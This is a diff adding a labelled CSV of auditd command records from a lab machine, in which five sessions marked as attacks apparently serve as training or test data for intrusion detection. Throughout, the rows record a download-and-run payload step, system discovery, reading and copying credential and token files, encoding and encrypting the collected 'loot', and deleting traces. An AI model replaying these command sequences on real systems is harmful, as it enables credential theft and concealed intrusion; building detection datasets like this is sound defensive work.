@@ -1,0 +1,160 @@
+_id,@timestamp,host.name,host,command_executed,a0,argc,is_attack,session_id
+auditd_attack_01_0001,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,"python3 -c import urllib.request; urllib.request.urlretrieve(""http://127.0.0.1:8088/payload.sh"",""/tmp/lab_payload.sh"")",python3,3,1,attack_session_01
+auditd_attack_01_0002,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab_payload.sh,chmod,3,1,attack_session_01
+auditd_attack_01_0003,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/bash /tmp/lab_payload.sh,/bin/bash,2,1,attack_session_01
+auditd_attack_01_0004,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_01
+auditd_attack_01_0005,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_01
+auditd_attack_01_0006,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_01
+auditd_attack_01_0007,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_01
+auditd_attack_01_0008,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_01
+auditd_attack_01_0009,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_01
+auditd_attack_01_0010,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_01
+auditd_attack_01_0011,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip addr,ip,2,1,attack_session_01
+auditd_attack_01_0012,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip route,ip,2,1,attack_session_01
+auditd_attack_01_0013,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ss -tuln,ss,2,1,attack_session_01
+auditd_attack_01_0014,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ps aux,ps,2,1,attack_session_01
+auditd_attack_01_0015,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /etc/passwd,cat,2,1,attack_session_01
+auditd_attack_01_0016,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp /etc/passwd loot/passwd_copy,cp,3,1,attack_session_01
+auditd_attack_01_0017,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/browser_creds.txt,cat,2,1,attack_session_01
+auditd_attack_01_0018,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/token.txt,cat,2,1,attack_session_01
+auditd_attack_01_0019,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/browser_creds.txt loot/,cp,3,1,attack_session_01
+auditd_attack_01_0020,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/token.txt loot/,cp,3,1,attack_session_01
+auditd_attack_01_0021,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -czf /tmp/lab_collection.tar.gz target loot,tar,5,1,attack_session_01
+auditd_attack_01_0022,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh -c gzip,/bin/sh,3,1,attack_session_01
+auditd_attack_01_0023,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip,gzip,1,1,attack_session_01
+auditd_attack_01_0024,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,xxd -p /tmp/lab_collection.tar.gz,xxd,3,1,attack_session_01
+auditd_attack_01_0025,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_PASSWORD -in target/report.txt -out /tmp/lab_report.enc,openssl,11,1,attack_session_01
+auditd_attack_01_0026,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab_collection.tar.gz /tmp/lab_report.enc,ls,5,1,attack_session_01
+auditd_attack_01_0027,2026-09-10T14:32:10Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/fake_crontab.txt,cat,2,1,attack_session_01
+auditd_attack_02_0001,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostnamectl,hostnamectl,1,1,attack_session_02
+auditd_attack_02_0002,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -r,uname,2,1,attack_session_02
+auditd_attack_02_0003,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_02
+auditd_attack_02_0004,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_02
+auditd_attack_02_0005,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,getent passwd,getent,2,1,attack_session_02
+auditd_attack_02_0006,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip link,ip,2,1,attack_session_02
+auditd_attack_02_0007,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip route,ip,2,1,attack_session_02
+auditd_attack_02_0008,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip neigh,ip,2,1,attack_session_02
+auditd_attack_02_0009,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ss -tun,ss,2,1,attack_session_02
+auditd_attack_02_0010,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ps -ef,ps,2,1,attack_session_02
+auditd_attack_02_0011,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,find /home/nexus/attack_lab02 -type f,find,4,1,attack_session_02
+auditd_attack_02_0012,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,grep --color=auto -R api_key target/,grep,5,1,attack_session_02
+auditd_attack_02_0013,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/fake_secrets.txt,cat,2,1,attack_session_02
+auditd_attack_02_0014,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat target/app.conf,cat,2,1,attack_session_02
+auditd_attack_02_0015,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64,base64,1,1,attack_session_02
+auditd_attack_02_0016,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 -d /tmp/lab02_payload.b64,base64,3,1,attack_session_02
+auditd_attack_02_0017,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab02_payload.sh,chmod,3,1,attack_session_02
+auditd_attack_02_0018,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/bash /tmp/lab02_payload.sh,/bin/bash,2,1,attack_session_02
+auditd_attack_02_0019,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_02
+auditd_attack_02_0020,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_02
+auditd_attack_02_0021,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/fake_secrets.txt loot/,cp,3,1,attack_session_02
+auditd_attack_02_0022,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/app.conf loot/,cp,3,1,attack_session_02
+auditd_attack_02_0023,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp target/document.txt loot/,cp,3,1,attack_session_02
+auditd_attack_02_0024,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -czf /tmp/lab02_collection.tar.gz loot/,tar,4,1,attack_session_02
+auditd_attack_02_0025,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh -c gzip,/bin/sh,3,1,attack_session_02
+auditd_attack_02_0026,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip,gzip,1,1,attack_session_02
+auditd_attack_02_0027,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,sha256sum /tmp/lab02_collection.tar.gz,sha256sum,2,1,attack_session_02
+auditd_attack_02_0028,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 /tmp/lab02_collection.tar.gz,base64,2,1,attack_session_02
+auditd_attack_02_0029,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat persistence/fake-update.service,cat,2,1,attack_session_02
+auditd_attack_02_0030,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_02 -in target/document.txt -out /tmp/lab02_document.enc,openssl,11,1,attack_session_02
+auditd_attack_02_0031,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab02_payload.sh /tmp/lab02_collection.tar.gz /tmp/lab02_collection.b64 /tmp/lab02_document.enc,ls,7,1,attack_session_02
+auditd_attack_02_0032,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab02_payload.b64,rm,2,1,attack_session_02
+auditd_attack_02_0033,2026-09-10T14:53:58Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab02_payload.sh,rm,2,1,attack_session_02
+auditd_attack_03_0001,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_03
+auditd_attack_03_0002,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_03
+auditd_attack_03_0003,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_03
+auditd_attack_03_0004,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_03
+auditd_attack_03_0005,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,env,env,1,1,attack_session_03
+auditd_attack_03_0006,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip addr,ip,2,1,attack_session_03
+auditd_attack_03_0007,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip route,ip,2,1,attack_session_03
+auditd_attack_03_0008,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ss -tuln,ss,2,1,attack_session_03
+auditd_attack_03_0009,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ps aux,ps,2,1,attack_session_03
+auditd_attack_03_0010,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,find /home/nexus/attack_lab03 -type f,find,4,1,attack_session_03
+auditd_attack_03_0011,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat config/credentials.txt,cat,2,1,attack_session_03
+auditd_attack_03_0012,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,grep --color=auto secret config/credentials.txt,grep,4,1,attack_session_03
+auditd_attack_03_0013,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat config/database.conf,cat,2,1,attack_session_03
+auditd_attack_03_0014,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp config/credentials.txt loot/,cp,3,1,attack_session_03
+auditd_attack_03_0015,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp config/database.conf loot/,cp,3,1,attack_session_03
+auditd_attack_03_0016,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp staging/report.txt loot/,cp,3,1,attack_session_03
+auditd_attack_03_0017,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -cf /tmp/lab03_archive.tar loot/,tar,4,1,attack_session_03
+auditd_attack_03_0018,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip /tmp/lab03_archive.tar,gzip,2,1,attack_session_03
+auditd_attack_03_0019,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,sha256sum /tmp/lab03_archive.tar.gz,sha256sum,2,1,attack_session_03
+auditd_attack_03_0020,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 config/credentials.txt,base64,2,1,attack_session_03
+auditd_attack_03_0021,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 -d /tmp/lab03_creds.b64,base64,3,1,attack_session_03
+auditd_attack_03_0022,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /tmp/lab03_creds_decoded.txt,cat,2,1,attack_session_03
+auditd_attack_03_0023,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_03 -in staging/report.txt -out /tmp/lab03_report.enc,openssl,11,1,attack_session_03
+auditd_attack_03_0024,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab03_exec.sh,chmod,3,1,attack_session_03
+auditd_attack_03_0025,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh /tmp/lab03_exec.sh,/bin/sh,2,1,attack_session_03
+auditd_attack_03_0026,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_03
+auditd_attack_03_0027,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_03
+auditd_attack_03_0028,2026-09-10T15:11:46Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab03_archive.tar.gz /tmp/lab03_report.enc /tmp/lab03_exec.sh,ls,6,1,attack_session_03
+auditd_attack_04_0001,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_04
+auditd_attack_04_0002,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_04
+auditd_attack_04_0003,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_04
+auditd_attack_04_0004,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_04
+auditd_attack_04_0005,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,find . -maxdepth 2 -type f,find,6,1,attack_session_04
+auditd_attack_04_0006,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,find . -type f -name .*,find,6,1,attack_session_04
+auditd_attack_04_0007,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,stat home_sim/.bash_history,stat,2,1,attack_session_04
+auditd_attack_04_0008,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat home_sim/.bash_history,cat,2,1,attack_session_04
+auditd_attack_04_0009,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat home_sim/authorized_keys,cat,2,1,attack_session_04
+auditd_attack_04_0010,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat home_sim/fake_cloud.env,cat,2,1,attack_session_04
+auditd_attack_04_0011,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,grep --color=auto SECRET home_sim/fake_cloud.env,grep,4,1,attack_session_04
+auditd_attack_04_0012,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp home_sim/.bash_history loot/,cp,3,1,attack_session_04
+auditd_attack_04_0013,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp home_sim/authorized_keys loot/,cp,3,1,attack_session_04
+auditd_attack_04_0014,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp home_sim/fake_cloud.env loot/,cp,3,1,attack_session_04
+auditd_attack_04_0015,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp staging/project.txt loot/,cp,3,1,attack_session_04
+auditd_attack_04_0016,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -cf /tmp/lab04_loot.tar loot/,tar,4,1,attack_session_04
+auditd_attack_04_0017,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip /tmp/lab04_loot.tar,gzip,2,1,attack_session_04
+auditd_attack_04_0018,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,sha256sum /tmp/lab04_loot.tar.gz,sha256sum,2,1,attack_session_04
+auditd_attack_04_0019,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 home_sim/fake_cloud.env,base64,2,1,attack_session_04
+auditd_attack_04_0020,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 -d /tmp/lab04_cloud.b64,base64,3,1,attack_session_04
+auditd_attack_04_0021,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /tmp/lab04_cloud_decoded.txt,cat,2,1,attack_session_04
+auditd_attack_04_0022,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,"python3 -c import pathlib; print(pathlib.Path(""home_sim/fake_cloud.env"").read_text())",python3,3,1,attack_session_04
+auditd_attack_04_0023,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,"python3 -c import base64; print(base64.b64encode(b""LAB04_PAYLOAD"").decode())",python3,3,1,attack_session_04
+auditd_attack_04_0024,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_04 -in staging/project.txt -out /tmp/lab04_project.enc,openssl,11,1,attack_session_04
+auditd_attack_04_0025,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab04_runner.sh,chmod,3,1,attack_session_04
+auditd_attack_04_0026,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh /tmp/lab04_runner.sh,/bin/sh,2,1,attack_session_04
+auditd_attack_04_0027,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_04
+auditd_attack_04_0028,2026-09-10T16:07:09Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab04_loot.tar.gz /tmp/lab04_project.enc /tmp/lab04_runner.sh,ls,6,1,attack_session_04
+auditd_attack_05_0001,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_05
+auditd_attack_05_0002,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_05
+auditd_attack_05_0003,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_05
+auditd_attack_05_0004,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,uname -a,uname,2,1,attack_session_05
+auditd_attack_05_0005,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,env,env,1,1,attack_session_05
+auditd_attack_05_0006,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip addr,ip,2,1,attack_session_05
+auditd_attack_05_0007,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip route,ip,2,1,attack_session_05
+auditd_attack_05_0008,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ip neigh,ip,2,1,attack_session_05
+auditd_attack_05_0009,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ss -tuln,ss,2,1,attack_session_05
+auditd_attack_05_0010,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ps -ef,ps,2,1,attack_session_05
+auditd_attack_05_0011,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,df -h,df,2,1,attack_session_05
+auditd_attack_05_0012,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,free -h,free,2,1,attack_session_05
+auditd_attack_05_0013,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,find . -type f,find,4,1,attack_session_05
+auditd_attack_05_0014,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -la secrets,ls,4,1,attack_session_05
+auditd_attack_05_0015,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,stat secrets/account.txt,stat,2,1,attack_session_05
+auditd_attack_05_0016,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat secrets/account.txt,cat,2,1,attack_session_05
+auditd_attack_05_0017,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat secrets/token.env,cat,2,1,attack_session_05
+auditd_attack_05_0018,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,grep --color=auto password secrets/account.txt,grep,4,1,attack_session_05
+auditd_attack_05_0019,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,grep --color=auto TOKEN secrets/token.env,grep,4,1,attack_session_05
+auditd_attack_05_0020,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp secrets/account.txt loot/,cp,3,1,attack_session_05
+auditd_attack_05_0021,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp secrets/token.env loot/,cp,3,1,attack_session_05
+auditd_attack_05_0022,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cp stage/document.txt loot/,cp,3,1,attack_session_05
+auditd_attack_05_0023,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,tar -cf /tmp/lab05_stage.tar loot/,tar,4,1,attack_session_05
+auditd_attack_05_0024,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,gzip /tmp/lab05_stage.tar,gzip,2,1,attack_session_05
+auditd_attack_05_0025,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,sha256sum /tmp/lab05_stage.tar.gz,sha256sum,2,1,attack_session_05
+auditd_attack_05_0026,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 secrets/account.txt,base64,2,1,attack_session_05
+auditd_attack_05_0027,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,base64 -d /tmp/lab05_account.b64,base64,3,1,attack_session_05
+auditd_attack_05_0028,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /tmp/lab05_account_decoded.txt,cat,2,1,attack_session_05
+auditd_attack_05_0029,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,xxd secrets/token.env,xxd,2,1,attack_session_05
+auditd_attack_05_0030,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,xxd -r /tmp/lab05_token.hex,xxd,3,1,attack_session_05
+auditd_attack_05_0031,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,cat /tmp/lab05_token_decoded.txt,cat,2,1,attack_session_05
+auditd_attack_05_0032,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:LAB_ONLY_05 -in stage/document.txt -out /tmp/lab05_document.enc,openssl,11,1,attack_session_05
+auditd_attack_05_0033,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,chmod +x /tmp/lab05_runner.sh,chmod,3,1,attack_session_05
+auditd_attack_05_0034,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,/bin/sh /tmp/lab05_runner.sh,/bin/sh,2,1,attack_session_05
+auditd_attack_05_0035,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,whoami,whoami,1,1,attack_session_05
+auditd_attack_05_0036,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,id,id,1,1,attack_session_05
+auditd_attack_05_0037,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,hostname,hostname,1,1,attack_session_05
+auditd_attack_05_0038,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,ls --color=auto -lh /tmp/lab05_stage.tar.gz /tmp/lab05_document.enc /tmp/lab05_runner.sh,ls,6,1,attack_session_05
+auditd_attack_05_0039,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab05_account.b64,rm,2,1,attack_session_05
+auditd_attack_05_0040,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab05_account_decoded.txt,rm,2,1,attack_session_05
+auditd_attack_05_0041,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab05_token.hex,rm,2,1,attack_session_05
+auditd_attack_05_0042,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab05_token_decoded.txt,rm,2,1,attack_session_05
+auditd_attack_05_0043,2026-09-10T16:23:04Z,cyber-lab-ubuntu,cyber-lab-ubuntu,rm /tmp/lab05_runner.sh,rm,2,1,attack_session_05
